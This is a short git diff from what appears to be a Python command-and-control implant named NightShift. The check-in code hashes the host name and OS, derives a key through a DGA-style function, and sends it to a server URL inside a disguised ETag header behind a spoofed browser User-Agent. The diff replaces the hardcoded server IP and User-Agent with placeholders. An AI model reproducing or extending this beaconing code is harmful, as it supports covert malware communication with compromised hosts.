@@ -48,11 +48,11 @@ class NightShift_Init_Check():
                 host_os_to_hash = str(host_name_f + os_type_f)
                 host_os_hashed_f = get_hash.hash_keys_hosts(host_os_to_hash)
                 # Server Contact Info
-                url = 'http://192.168.254.82:8080'
+                url = 'http://<init url goes here>:<port>/<uri goes here>'
                 header_key = get_key.ns_dga_algorithm('key')
                 hash_key = get_hash.hash_keys_hosts(header_key)
                 headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0',
+                    'User-Agent': '<User Agent goes here>',
                     'ETag': hash_key
                     }
                 # print(header_key)
